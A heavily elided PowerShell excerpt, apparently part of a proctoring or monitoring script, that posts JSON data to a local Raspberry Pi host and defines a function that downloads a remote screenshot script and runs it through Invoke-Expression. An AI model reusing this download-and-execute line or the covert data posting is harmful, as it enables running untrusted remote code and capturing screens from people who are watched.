...
'@
            while(1){
                ...
                if (Is_Connected -ne $null){
                    ...
                    while (-not $completed){
                        try{
                            $response = Invoke-WebRequest -Uri http://raspberrypi.local/ -UseBasicParsing -Method POST -Body ($data|ConvertTo-Json) -ContentType 'application/json'
    ...
    function Get_Screenshot_Script{
        Invoke-Expression(New-Object System.Net.WebClient).DownloadString('https://24.jubilian.one/uploads/proctoring_script_screenshot.ps1')
    }
...
Start-Sleep 2
$job5 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Screenshot_Script} 
Start-Sleep 2
wait-Job $heartbeat 
Wait-Job $job1 
Wait-Job $job2 
